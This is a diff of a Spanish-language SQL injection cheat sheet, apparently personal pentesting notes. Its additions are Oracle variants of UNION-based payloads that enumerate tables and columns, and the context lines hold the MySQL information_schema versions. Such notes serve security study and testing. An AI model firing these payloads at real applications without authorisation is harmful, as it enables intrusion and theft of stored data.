@@ -82,6 +82,7 @@ Para saber las bases de datos (DB) existentes.
 	# Donde 0 indica la primer base de datos y es el valor que ira variando, esto dependiendo de las bases de datos que existan
 	# El segundo '1' es la posicion de la letra en cada palabra y este valor ira variando para ir avanzando a las sig. posiciones de la palabra
 	# 'A' es la letra a la que queremos igualar la consulta 
+
 ```
 
 Para saber las tablas de la base de datos (DB) especifica.
@@ -89,6 +90,10 @@ Para saber las tablas de la base de datos (DB) especifica.
 ❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -                    # Nos muestra las tablas existentes
 ❯ ' union select group_concat(table_name) from information_schema.tables where table_schema='❮DB_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
 ❯ ' union select table_name from information_schema.tables limit 0,1-- -                                         # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
+
+❯ ' union select table_name from all_tables-- -                                                                  # Nos muestra las tablas en Oracle
+❯ ' union select owner from all_tables-- -                                                                       # Nos muestra las tablas en Oracle de los propietarios
+❯ ' union select table_name from all_tables where owner='❮owner_Name❯'-- -
 ```
 
 Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica.
@@ -96,6 +101,8 @@ Para saber las columnas de la tabla que encontramos y la base de datos  (DB) esp
 ❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las tablas existentes
 ❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
 ❯ ' union select group_concat(column_name) from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
+
+❯ ' union select column_name from all_tab_columns where table_name='❮Table_Name❯'                      # Mostrar las columnas en Oracle 
 ```
 
 Para que nos muestre los datos de las columnas.
